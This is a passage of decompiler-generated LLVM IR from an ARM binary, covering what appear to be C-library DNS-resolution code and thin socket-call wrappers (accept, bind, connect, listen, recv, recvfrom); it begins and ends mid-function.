  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12c04 = load i32, i32* @r4, align 4
  %v6_12c04 = load i32, i32* @r5, align 4
  %v9_12c04 = load i32, i32* @r6, align 4
  %v12_12c04 = load i32, i32* @r7, align 4
  %v15_12c04 = load i32, i32* @r8, align 4
  %v18_12c04 = load i32, i32* @sb, align 4
  %v21_12c04 = load i32, i32* @sl, align 4
  %v24_12c04 = load i32, i32* @fp, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %v0_12c14 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12c14, i32* @fp, align 4
  %v2_12c14 = icmp eq i32 %v0_12c14, 0
  store i32 0, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg4, i32* @r4, align 4
  %v2_12c24 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_12c24, align 4
  br i1 %v2_12c14, label %bb, label %dec_label_pc_12c30

bb:                                               ; preds = %entry
  %v1_12c28 = load i32, i32* %r0.global-to-local, align 4
  %v2_12c28 = add i32 %v1_12c28, 22
  store i32 %v2_12c28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12f54

dec_label_pc_12c30:                               ; preds = %entry
  %v0_12c30 = call i32 @__errno_location()
  store i32 %v0_12c30, i32* %r0.global-to-local, align 4
  %v3_12c34 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_12c34, i32* %ip.global-to-local, align 4
  %v1_12c38 = inttoptr i32 %v0_12c30 to i32*
  %v2_12c38 = load i32, i32* %v1_12c38, align 4
  store i32 %v2_12c38, i32* @r8, align 4
  %v0_12c3c = load i32, i32* @r6, align 4
  store i32 %v0_12c3c, i32* %v1_12c38, align 4
  %v0_12c40 = load i32, i32* %ip.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_12c30, i32* @r5, align 4
  %v0_12c50 = load i32, i32* @fp, align 4
  store i32 %v0_12c50, i32* %r0.global-to-local, align 4
  %v0_12c54 = load i32, i32* @sl, align 4
  store i32 %v0_12c54, i32* %r2.global-to-local, align 4
  %v0_12c58 = load i32, i32* @r7, align 4
  store i32 %v0_12c58, i32* %r3.global-to-local, align 4
  %v0_12c5c = load i32, i32* @r4, align 4
  %v7_12c64 = call i32 @__get_hosts_byname_r(i32 %v0_12c50, i32 2, i32 %v0_12c54, i32 %v0_12c58, i32 %v0_12c5c, i32 %v0_12c40, i32 %arg6)
  store i32 %v7_12c64, i32* %r0.global-to-local, align 4
  %v2_12c68 = icmp eq i32 %v7_12c64, 0
  br i1 %v2_12c68, label %dec_label_pc_12f54, label %dec_label_pc_12c70

dec_label_pc_12c70:                               ; preds = %dec_label_pc_12c30
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v1_12c74 = inttoptr i32 %arg6 to i32*
  %v2_12c74 = load i32, i32* %v1_12c74, align 4
  store i32 %v2_12c74, i32* %r3.global-to-local, align 4
  %v7_12c78 = icmp eq i32 %v2_12c74, 1
  br i1 %v7_12c78, label %dec_label_pc_12c9c, label %dec_label_pc_12c80

dec_label_pc_12c80:                               ; preds = %dec_label_pc_12c70
  %v7_12c80 = icmp eq i32 %v2_12c74, 4
  br i1 %v7_12c80, label %dec_label_pc_12c9c, label %dec_label_pc_12c88

dec_label_pc_12c88:                               ; preds = %dec_label_pc_12c80
  %v3_12c88 = icmp eq i32 %v2_12c74, -1
  br i1 %v3_12c88, label %dec_label_pc_12c90, label %dec_label_pc_12f54

dec_label_pc_12c90:                               ; preds = %dec_label_pc_12c88
  %v0_12c90 = load i32, i32* @r5, align 4
  %v1_12c90 = inttoptr i32 %v0_12c90 to i32*
  %v2_12c90 = load i32, i32* %v1_12c90, align 4
  store i32 %v2_12c90, i32* %r3.global-to-local, align 4
  %v7_12c94 = icmp eq i32 %v2_12c90, 2
  br i1 %v7_12c94, label %dec_label_pc_12c9c, label %dec_label_pc_12f54

dec_label_pc_12c9c:                               ; preds = %dec_label_pc_12c90, %dec_label_pc_12c80, %dec_label_pc_12c70
  %v0_12c9c = load i32, i32* @r7, align 4
  %v1_12c9c = sub i32 0, %v0_12c9c
  %v1_12ca0 = urem i32 %v1_12c9c, 4
  store i32 %v1_12ca0, i32* %r3.global-to-local, align 4
  %v2_12ca0 = icmp eq i32 %v1_12ca0, 0
  %v0_12ca4 = load i32, i32* @r8, align 4
  %v1_12ca4 = load i32, i32* @r5, align 4
  %v2_12ca4 = inttoptr i32 %v1_12ca4 to i32*
  store i32 %v0_12ca4, i32* %v2_12ca4, align 4
  %v0_12cc4.pre = load i32, i32* @r4, align 4
  br i1 %v2_12ca0, label %dec_label_pc_12cbc, label %dec_label_pc_12cac

dec_label_pc_12cac:                               ; preds = %dec_label_pc_12c9c
  %v1_12cac = load i32, i32* %r3.global-to-local, align 4
  %v2_12cac = sub i32 %v0_12cc4.pre, %v1_12cac
  %v3_12cac = icmp ult i32 %v0_12cc4.pre, %v1_12cac
  br i1 %v3_12cac, label %dec_label_pc_12f50, label %dec_label_pc_12cb4

dec_label_pc_12cb4:                               ; preds = %dec_label_pc_12cac
  store i32 %v2_12cac, i32* @r4, align 4
  %v0_12cb8 = load i32, i32* @r7, align 4
  %v2_12cb8 = add i32 %v0_12cb8, %v1_12cac
  store i32 %v2_12cb8, i32* @r7, align 4
  br label %dec_label_pc_12cbc

dec_label_pc_12cbc:                               ; preds = %dec_label_pc_12c9c, %dec_label_pc_12cb4
  %v0_12cc4 = phi i32 [ %v2_12cac, %dec_label_pc_12cb4 ], [ %v0_12cc4.pre, %dec_label_pc_12c9c ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %v1_12c74, align 4
  %tmp31 = icmp ult i32 %v0_12cc4, 4
  br i1 %tmp31, label %dec_label_pc_12f50, label %dec_label_pc_12cd0

dec_label_pc_12cd0:                               ; preds = %dec_label_pc_12cbc
  %v0_12cd0 = load i32, i32* @r4, align 4
  %v1_12cd0 = add i32 %v0_12cd0, -4
  store i32 %v1_12cd0, i32* %r3.global-to-local, align 4
  %tmp32 = icmp ult i32 %v1_12cd0, 8
  br i1 %tmp32, label %dec_label_pc_12f50, label %dec_label_pc_12cdc

dec_label_pc_12cdc:                               ; preds = %dec_label_pc_12cd0
  %v1_12cdc = add i32 %v0_12cd0, -12
  store i32 %v1_12cdc, i32* %r3.global-to-local, align 4
  %v0_12ce0 = load i32, i32* @r7, align 4
  %v1_12ce0 = add i32 %v0_12ce0, 4
  store i32 %v1_12ce0, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v3_12cec = inttoptr i32 %v1_12ce0 to i32*
  store i32 %v0_12ce0, i32* %v3_12cec, align 4
  %v0_12cf0 = load i32, i32* @r5, align 4
  %v1_12cf0 = load i32, i32* @sb, align 4
  %v2_12cf0 = add i32 %v1_12cf0, 4
  %v3_12cf0 = inttoptr i32 %v2_12cf0 to i32*
  store i32 %v0_12cf0, i32* %v3_12cf0, align 4
  %tmp33 = icmp ult i32 %v1_12cdc, 32
  br i1 %tmp33, label %dec_label_pc_12f50, label %dec_label_pc_12cf8

dec_label_pc_12cf8:                               ; preds = %dec_label_pc_12cdc
  %v0_12cf8 = load i32, i32* @r4, align 4
  %v1_12cf8 = add i32 %v0_12cf8, -44
  store i32 %v1_12cf8, i32* @r8, align 4
  %tmp34 = icmp ult i32 %v1_12cf8, 256
  br i1 %tmp34, label %dec_label_pc_12f50, label %dec_label_pc_12d04

dec_label_pc_12d04:                               ; preds = %dec_label_pc_12cf8
  %v0_12d04 = load i32, i32* @r7, align 4
  %v1_12d04 = add i32 %v0_12d04, 44
  store i32 %v1_12d04, i32* @r6, align 4
  %v1_12d08 = add i32 %v0_12d04, 12
  store i32 %v1_12d08, i32* %r3.global-to-local, align 4
  %v0_12d0c = load i32, i32* @fp, align 4
  store i32 %v0_12d0c, i32* @r1, align 4
  store i32 %v1_12cf8, i32* %r2.global-to-local, align 4
  store i32 %v1_12d04, i32* %r0.global-to-local, align 4
  %v3_12d1c = call i32 @strncpy(i32 %v1_12d04, i32 %v0_12d0c, i32 %v1_12cf8)
  store i32 %v1_12d08, i32* %ip.global-to-local, align 4
  %v0_12d24 = load i32, i32* @r6, align 4
  %v1_12d24 = load i32, i32* @r7, align 4
  %v2_12d24 = add i32 %v1_12d24, 12
  %v3_12d24 = inttoptr i32 %v2_12d24 to i32*
  store i32 %v0_12d24, i32* %v3_12d24, align 4
  %v0_12d28 = load i32, i32* @fp, align 4
  store i32 %v0_12d28, i32* %r0.global-to-local, align 4
  %v0_12d2c = load i32, i32* @r5, align 4
  %v1_12d2c = load i32, i32* %ip.global-to-local, align 4
  %v2_12d2c = add i32 %v1_12d2c, 4
  %v3_12d2c = inttoptr i32 %v2_12d2c to i32*
  store i32 %v0_12d2c, i32* %v3_12d2c, align 4
  %v0_12d30 = load i32, i32* @r7, align 4
  %v2_12d34 = inttoptr i32 %v0_12d28 to i8*
  %v3_12d34 = call i32 @inet_aton(i8* %v2_12d34, i32 %v0_12d30)
  store i32 %v3_12d34, i32* %r0.global-to-local, align 4
  %v2_12d38 = icmp eq i32 %v3_12d34, 0
  br i1 %v2_12d38, label %dec_label_pc_12d7c, label %dec_label_pc_12d44

dec_label_pc_12d44:                               ; preds = %dec_label_pc_12d04
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_12d48 = load i32, i32* @sl, align 4
  %v2_12d48 = add i32 %v1_12d48, 8
  %v3_12d48 = inttoptr i32 %v2_12d48 to i32*
  store i32 2, i32* %v3_12d48, align 4
  %v0_12d4c = load i32, i32* %r3.global-to-local, align 4
  %v2_12d4c = mul i32 %v0_12d4c, 2
  %v1_12d50 = load i32, i32* @sl, align 4
  %v2_12d50 = add i32 %v1_12d50, 12
  %v3_12d50 = inttoptr i32 %v2_12d50 to i32*
  store i32 %v2_12d4c, i32* %v3_12d50, align 4
  %v3_12d54 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_12d54, i32* %r2.global-to-local, align 4
  store i32 %v1_12d08, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  %v0_12d60 = load i32, i32* @r5, align 4
  store i32 %v0_12d60, i32* %r0.global-to-local, align 4
  %v0_12d64 = load i32, i32* @sl, align 4
  %v2_12d64 = inttoptr i32 %v3_12d54 to i32*
  store i32 %v0_12d64, i32* %v2_12d64, align 4
  %v0_12d68 = load i32, i32* @r6, align 4
  %v1_12d68 = load i32, i32* @sl, align 4
  %v2_12d68 = inttoptr i32 %v1_12d68 to i32*
  store i32 %v0_12d68, i32* %v2_12d68, align 4
  %v0_12d6c = load i32, i32* @sb, align 4
  %v1_12d6c = load i32, i32* @sl, align 4
  %v2_12d6c = add i32 %v1_12d6c, 16
  %v3_12d6c = inttoptr i32 %v2_12d6c to i32*
  store i32 %v0_12d6c, i32* %v3_12d6c, align 4
  %v0_12d70 = load i32, i32* %r3.global-to-local, align 4
  %v1_12d70 = load i32, i32* @sl, align 4
  %v2_12d70 = add i32 %v1_12d70, 4
  %v3_12d70 = inttoptr i32 %v2_12d70 to i32*
  store i32 %v0_12d70, i32* %v3_12d70, align 4
  %v0_12d74 = load i32, i32* @r5, align 4
  %v1_12d74 = load i32, i32* %ip.global-to-local, align 4
  %v2_12d74 = inttoptr i32 %v1_12d74 to i32*
  store i32 %v0_12d74, i32* %v2_12d74, align 4
  br label %dec_label_pc_12f54

dec_label_pc_12d7c:                               ; preds = %dec_label_pc_12d04
  %v2_12d7c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_12d7c, i32* @r5, align 4
  %v1_12d80 = call i32 @__open_nameservers(i32 0)
  store i32 ptrtoint (i32* @global_var_2b8c0.676 to i32), i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 %v2_12d7c, i32* @r0, align 4
  store i32 58060, i32* %r3.global-to-local, align 4
  %v1_12d98 = call i32 @__pthread_cleanup_push_defer()
  store i32 62768, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2b8c0.676 to i32), i32* %r0.global-to-local, align 4
  %v2_12da8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b8c0.676 to i32))
  store i32 %v2_12d7c, i32* @r0, align 4
  %v2_12db4 = load i32, i32* @global_var_30330.681, align 4
  store i32 %v2_12db4, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i32 58236, i32* %r3.global-to-local, align 4
  store i32 77256, i32* @lr, align 4
  %v1_12dc4 = call i32 @__pthread_cleanup_pop_restore()
  %v2_12dd0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_30324.684 to i32), i32* %r3.global-to-local, align 4
  %v0_12ddc = load i32, i32* @fp, align 4
  store i32 %v0_12ddc, i32* %r0.global-to-local, align 4
  %v2_12de0 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_12de0, i32* %ip.global-to-local, align 4
  %v0_12de4 = load i32, i32* @r4, align 4
  store i32 %v0_12de4, i32* %r2.global-to-local, align 4
  %v6_12df8 = inttoptr i32 %v0_12ddc to i8*
  %v7_12df8 = call i32 @__dns_lookup(i8* %v6_12df8, i32 1, i32 %v0_12de4, i32 ptrtoint (i32* @global_var_30324.684 to i32), i32 %v2_12dd0, i32 %v2_12de0)
  store i32 %v7_12df8, i32* %r0.global-to-local, align 4
  %v1_12dfc = icmp slt i32 %v7_12df8, 0
  br i1 %v1_12dfc, label %.dec_label_pc_12f28_crit_edge, label %dec_label_pc_12e0c

.dec_label_pc_12f28_crit_edge:                    ; preds = %dec_label_pc_12d7c
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12f28

dec_label_pc_12e0c:                               ; preds = %dec_label_pc_12d7c
  store i32 256, i32* %r3.global-to-local, align 4
  %v1_12e20 = load i32, i32* @r8, align 4
  %tmp35 = icmp ugt i32 %v1_12e20, 255
  br i1 %tmp35, label %dec_label_pc_12ebc, label %dec_label_pc_12e28

dec_label_pc_12e28:                               ; preds = %dec_label_pc_12e0c
  %v3_12e28 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_12e28, i32* @r0, align 4
  %v0_12e2c = call i32 @free()
  %v3_12e30 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_12e30, i32* @r0, align 4
  %v0_12e34 = call i32 @free()
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %v1_12c74, align 4
  br label %dec_label_pc_12f54

dec_label_pc_12ebc:                               ; preds = %dec_label_pc_12e0c
  %v3_12ec0.pre = load i32, i32* %stack_var_-96, align 4
  %v0_12ec4.pre = load i32, i32* @r6, align 4
  store i32 %v1_12e20, i32* %r2.global-to-local, align 4
  store i32 %v3_12ec0.pre, i32* @r1, align 4
  store i32 %v0_12ec4.pre, i32* %r0.global-to-local, align 4
  %v3_12ec8 = call i32 @strncpy(i32 %v0_12ec4.pre, i32 %v3_12ec0.pre, i32 %v1_12e20)
  %v3_12ecc = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_12ecc, i32* @r0, align 4
  %v0_12ed0 = call i32 @free()
  store i32 %v0_12ed0, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %v7_12ed8 = icmp eq i32 %tmp7, 1
  br i1 %v7_12ed8, label %dec_label_pc_12ee0, label %dec_label_pc_12f34

dec_label_pc_12ee0:                               ; preds = %dec_label_pc_12ebc
  store i32 4, i32* @r2, align 4
  %v0_12ee8 = load i32, i32* @r7, align 4
  store i32 %v0_12ee8, i32* @r0, align 4
  %v0_12eec = call i32 @memcpy()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v1_12d08, i32* %r2.global-to-local, align 4
  %v1_12ef8 = load i32, i32* @sl, align 4
  %v2_12ef8 = add i32 %v1_12ef8, 8
  %v3_12ef8 = inttoptr i32 %v2_12ef8 to i32*
  store i32 2, i32* %v3_12ef8, align 4
  %v0_12efc = load i32, i32* %r3.global-to-local, align 4
  %v2_12efc = mul i32 %v0_12efc, 2
  store i32 %v2_12efc, i32* %r3.global-to-local, align 4
  %v1_12f00 = load i32, i32* @sl, align 4
  %v2_12f00 = add i32 %v1_12f00, 12
  %v3_12f00 = inttoptr i32 %v2_12f00 to i32*
  store i32 %v2_12efc, i32* %v3_12f00, align 4
  %v3_12f04 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_12f04, i32* @r0, align 4
  %v0_12f08 = load i32, i32* @r6, align 4
  %v1_12f08 = load i32, i32* @sl, align 4
  %v2_12f08 = inttoptr i32 %v1_12f08 to i32*
  store i32 %v0_12f08, i32* %v2_12f08, align 4
  %v0_12f0c = load i32, i32* @sb, align 4
  %v1_12f0c = load i32, i32* @sl, align 4
  %v2_12f0c = add i32 %v1_12f0c, 16
  %v3_12f0c = inttoptr i32 %v2_12f0c to i32*
  store i32 %v0_12f0c, i32* %v3_12f0c, align 4
  %v0_12f10 = load i32, i32* %r2.global-to-local, align 4
  %v1_12f10 = load i32, i32* @sl, align 4
  %v2_12f10 = add i32 %v1_12f10, 4
  %v3_12f10 = inttoptr i32 %v2_12f10 to i32*
  store i32 %v0_12f10, i32* %v3_12f10, align 4
  %v0_12f14 = call i32 @free()
  %v3_12f18 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_12f18, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_12f20 = load i32, i32* @sl, align 4
  %v2_12f20 = inttoptr i32 %v3_12f18 to i32*
  store i32 %v0_12f20, i32* %v2_12f20, align 4
  %v0_12f24 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_12f24, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12f28

dec_label_pc_12f28:                               ; preds = %.dec_label_pc_12f28_crit_edge, %dec_label_pc_12ee0
  %v0_12f2c = phi i32 [ 1, %.dec_label_pc_12f28_crit_edge ], [ %v0_12f24, %dec_label_pc_12ee0 ]
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 %v0_12f2c, i32* %v1_12c74, align 4
  br label %dec_label_pc_12f54

dec_label_pc_12f34:                               ; preds = %dec_label_pc_12ebc
  %v3_12f34 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_12f34, i32* @r0, align 4
  %v0_12f38 = call i32 @free()
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %v1_12c74, align 4
  br label %dec_label_pc_12f54

dec_label_pc_12f50:                               ; preds = %dec_label_pc_12cac, %dec_label_pc_12cf8, %dec_label_pc_12cdc, %dec_label_pc_12cd0, %dec_label_pc_12cbc
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12f54

dec_label_pc_12f54:                               ; preds = %bb, %dec_label_pc_12c90, %dec_label_pc_12c88, %dec_label_pc_12c30, %dec_label_pc_12f34, %dec_label_pc_12f28, %dec_label_pc_12e28, %dec_label_pc_12d44, %dec_label_pc_12f50
  store i32 %v3_12c04, i32* @r4, align 4
  store i32 %v6_12c04, i32* @r5, align 4
  store i32 %v9_12c04, i32* @r6, align 4
  store i32 %v12_12c04, i32* @r7, align 4
  store i32 %v15_12c04, i32* @r8, align 4
  store i32 %v18_12c04, i32* @sb, align 4
  store i32 %v21_12c04, i32* @sl, align 4
  store i32 %v24_12c04, i32* @fp, align 4
  %v29_12f58 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_12f58

; uselistorder directives
  uselistorder i32 %v2_12efc, { 1, 0 }
  uselistorder i32 %v1_12e20, { 1, 2, 0 }
  uselistorder i32 %v1_12d08, { 1, 2, 0, 3 }
  uselistorder i32 %v1_12d04, { 1, 0, 2 }
  uselistorder i32 %v1_12cf8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_12cc4.pre, { 0, 2, 1 }
  uselistorder i32 %v1_12ca0, { 1, 0 }
  uselistorder i32* %v1_12c74, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_12c14, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 7, 8, 9, 10, 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 18, 8, 9, 10, 11, 12, 13, 14, 17, 15, 16, 19, 21, 20, 3, 5, 4, 7, 6, 0, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 0, 1, 2, 3 }
  uselistorder i32 (i8*, i32)* @inet_aton, { 1, 0 }
  uselistorder i32 %arg6, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_12f54, { 8, 4, 5, 6, 7, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_12f50, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_12f28, { 1, 0 }
  uselistorder label %dec_label_pc_12cbc, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12f78 = load i32, i32* @r4, align 4
  store i32 %v3_12f78, i32* %stack_var_-8, align 4
  %v0_12f7c = call i32 @accept()
  store i32 %v0_12f7c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12f7c, -4095
  br i1 %tmp, label %dec_label_pc_12f9c, label %dec_label_pc_12f8c

dec_label_pc_12f8c:                               ; preds = %entry
  %v0_12f8c = call i32 @__errno_location()
  %v0_12f90 = load i32, i32* %r4.global-to-local, align 4
  %v1_12f90 = sub i32 0, %v0_12f90
  %v2_12f94 = inttoptr i32 %v0_12f8c to i32*
  store i32 %v1_12f90, i32* %v2_12f94, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12f9c

dec_label_pc_12f9c:                               ; preds = %entry, %dec_label_pc_12f8c
  %v0_12f9c = phi i32 [ %v0_12f7c, %entry ], [ -1, %dec_label_pc_12f8c ]
  %v2_12fa0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12fa0, i32* %r4.global-to-local, align 4
  ret i32 %v0_12f9c

; uselistorder directives
  uselistorder i32 %v0_12f7c, { 1, 0, 2 }
  uselistorder i32 ()* @accept, { 1, 0 }
  uselistorder label %dec_label_pc_12f9c, { 1, 0 }
}

define i32 @bind() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12fa4 = load i32, i32* @r4, align 4
  store i32 %v3_12fa4, i32* %stack_var_-8, align 4
  %v0_12fa8 = call i32 @bind()
  store i32 %v0_12fa8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12fa8, -4095
  br i1 %tmp, label %dec_label_pc_12fc8, label %dec_label_pc_12fb8

dec_label_pc_12fb8:                               ; preds = %entry
  %v0_12fb8 = call i32 @__errno_location()
  %v0_12fbc = load i32, i32* %r4.global-to-local, align 4
  %v1_12fbc = sub i32 0, %v0_12fbc
  %v2_12fc0 = inttoptr i32 %v0_12fb8 to i32*
  store i32 %v1_12fbc, i32* %v2_12fc0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12fc8

dec_label_pc_12fc8:                               ; preds = %entry, %dec_label_pc_12fb8
  %v0_12fc8 = phi i32 [ %v0_12fa8, %entry ], [ -1, %dec_label_pc_12fb8 ]
  %v2_12fcc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12fcc, i32* @r4, align 4
  ret i32 %v0_12fc8

; uselistorder directives
  uselistorder i32 %v0_12fa8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12fc8, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12fd0 = load i32, i32* @r4, align 4
  store i32 %v3_12fd0, i32* %stack_var_-8, align 4
  %v0_12fd4 = call i32 @connect()
  store i32 %v0_12fd4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12fd4, -4095
  br i1 %tmp, label %dec_label_pc_12ff4, label %dec_label_pc_12fe4

dec_label_pc_12fe4:                               ; preds = %entry
  %v0_12fe4 = call i32 @__errno_location()
  %v0_12fe8 = load i32, i32* %r4.global-to-local, align 4
  %v1_12fe8 = sub i32 0, %v0_12fe8
  %v2_12fec = inttoptr i32 %v0_12fe4 to i32*
  store i32 %v1_12fe8, i32* %v2_12fec, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12ff4

dec_label_pc_12ff4:                               ; preds = %entry, %dec_label_pc_12fe4
  %v0_12ff4 = phi i32 [ %v0_12fd4, %entry ], [ -1, %dec_label_pc_12fe4 ]
  %v2_12ff8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12ff8, i32* @r4, align 4
  ret i32 %v0_12ff4

; uselistorder directives
  uselistorder i32 %v0_12fd4, { 1, 0, 2 }
  uselistorder i32 ()* @connect, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12ff4, { 1, 0 }
}

define i32 @listen() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12ffc = load i32, i32* @r4, align 4
  store i32 %v3_12ffc, i32* %stack_var_-8, align 4
  %v0_13000 = call i32 @listen()
  store i32 %v0_13000, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13000, -4095
  br i1 %tmp, label %dec_label_pc_13020, label %dec_label_pc_13010

dec_label_pc_13010:                               ; preds = %entry
  %v0_13010 = call i32 @__errno_location()
  %v0_13014 = load i32, i32* %r4.global-to-local, align 4
  %v1_13014 = sub i32 0, %v0_13014
  %v2_13018 = inttoptr i32 %v0_13010 to i32*
  store i32 %v1_13014, i32* %v2_13018, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13020

dec_label_pc_13020:                               ; preds = %entry, %dec_label_pc_13010
  %v0_13020 = phi i32 [ %v0_13000, %entry ], [ -1, %dec_label_pc_13010 ]
  %v2_13024 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13024, i32* @r4, align 4
  ret i32 %v0_13020

; uselistorder directives
  uselistorder i32 %v0_13000, { 1, 0, 2 }
  uselistorder i32 ()* @listen, { 1, 0 }
  uselistorder label %dec_label_pc_13020, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13028 = load i32, i32* @r4, align 4
  store i32 %v3_13028, i32* %stack_var_-8, align 4
  %v0_1302c = call i32 @recv()
  store i32 %v0_1302c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1302c, -4095
  br i1 %tmp, label %dec_label_pc_1304c, label %dec_label_pc_1303c

dec_label_pc_1303c:                               ; preds = %entry
  %v0_1303c = call i32 @__errno_location()
  %v0_13040 = load i32, i32* %r4.global-to-local, align 4
  %v1_13040 = sub i32 0, %v0_13040
  %v2_13044 = inttoptr i32 %v0_1303c to i32*
  store i32 %v1_13040, i32* %v2_13044, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1304c

dec_label_pc_1304c:                               ; preds = %entry, %dec_label_pc_1303c
  %v0_1304c = phi i32 [ %v0_1302c, %entry ], [ -1, %dec_label_pc_1303c ]
  %v2_13050 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13050, i32* @r4, align 4
  ret i32 %v0_1304c

; uselistorder directives
  uselistorder i32 %v0_1302c, { 1, 0, 2 }
  uselistorder i32 ()* @recv, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1304c, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13054 = load i32, i32* @r4, align 4
  store i32 %v3_13054, i32* %stack_var_-12, align 4
  %v6_13054 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  %v0_13060 = call i32 @recvfrom()
  store i32 %v0_13060, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13060, -4095
